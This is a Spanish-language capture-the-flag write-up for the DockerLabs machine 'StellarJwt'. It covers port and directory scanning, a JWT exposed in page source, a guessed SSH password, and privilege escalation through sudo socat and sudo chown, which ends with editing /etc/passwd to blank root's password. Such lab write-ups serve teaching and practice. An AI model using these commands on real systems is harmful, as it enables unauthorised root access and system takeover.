@@ -1,0 +1,212 @@
+---
+title: StellarJwt
+description: Resolución completa de la máquina virtual *StellarJwt* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **StellarJwt**, desarrollada por *Alv-fh* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un sitio web que contiene un token JWT expuesto en el código fuente, revelando el nombre de usuario `neptuno`. Además, una pista en la página principal permite deducir la contraseña del usuario, facilitando el acceso SSH al sistema.
+Una vez dentro, se encuentra un mensaje que revela credenciales para el usuario `nasa`. Desde allí, se abusa de configuraciones inseguras de `sudo` con los binarios `socat` y `chown` para escalar privilegios progresivamente hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'StellarJwt',
+    Autor: 'Alv-fh',
+    Dificultad: 'Fácil',
+    Fecha: '25/10/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip StellarJwt.zip
+sudo bash auto_deploy.sh StellarJwt.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p StellarJwt/{content,exploits,nmap,scripts}
+cd StellarJwt
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Ports_schdsw.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Gobuster_xlg50j.png)
+
+**Rutas encontradas:**
+- `/index.html` — Página principal con una pista.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Index_ff7zhe.png)
+- `/universe` — Página secundaria con una imagen de galaxia.
+
+En el código fuente de `/universe` se encuentra un **token JWT** comentado:
+
+![Universe Code](https://res.cloudinary.com/dewqswzke/image/upload/v1763007885/UniverseCode_wqhm8z.png)
+
+Al decodificar el JWT en [jwt.io](https://jwt.io), se obtiene el usuario **neptuno**:
+
+![JWT](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Jwt_pylsjn.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Deducir contraseña
+
+La pista en la página principal ("¿Qué astrónomo alemán descubrió Neptuno?") indica la respuesta: **Johann Gottfried Galle**.
+
+Se prueba la conexión SSH con el usuario `neptuno` y la contraseña `Gottfried`:
+
+```bash
+ssh neptuno@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1763007884/SSH_bvjpdv.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De neptuno → nasa
+
+En el directorio home de `neptuno` se encuentra un archivo `.carta_a_la_NASA.txt`:
+
+![Carta](https://res.cloudinary.com/dewqswzke/image/upload/v1763007882/CartaAlaNasa_g7gevt.png)
+
+El mensaje revela pistas para la contraseña del usuario `nasa` (año de fundación de la NASA y nombre del fundador). Se deduce la contraseña y se cambia al usuario:
+
+```bash
+su nasa
+```
+
+### 3.2 De nasa → elite
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l nasa](https://res.cloudinary.com/dewqswzke/image/upload/v1763007885/Sudo-lNasa_bin8np.png)
+
+Se puede ejecutar `socat` como `elite`:
+
+```bash
+sudo -u elite socat stdin exec:/bin/bash
+```
+
+![Elite](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Elite_gsisxd.png)
+
+### 3.3 De elite → root
+
+Se verifican los permisos sudo de `elite`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l elite](https://res.cloudinary.com/dewqswzke/image/upload/v1763007884/Sudo-lElite_ssycci.png)
+
+Se puede ejecutar `chown` como root, permitiendo modificar la propiedad de `/etc/passwd`:
+
+```bash
+sudo chown elite:elite /etc/passwd
+sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd
+cat /tmp/passwd > /etc/passwd
+su
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763007883/Root_yh6zn6.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Token JWT expuesto en código fuente",
+      severity: "Media",
+      impact: "Revelación de nombres de usuario del sistema"
+    },
+    {
+      vulnerability: "Contraseña basada en información pública",
+      severity: "Alta",
+      impact: "Acceso SSH mediante deducción de credenciales"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en socat",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario elite"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en chown",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante modificación de /etc/passwd"
+    }
+  ]}
+/>
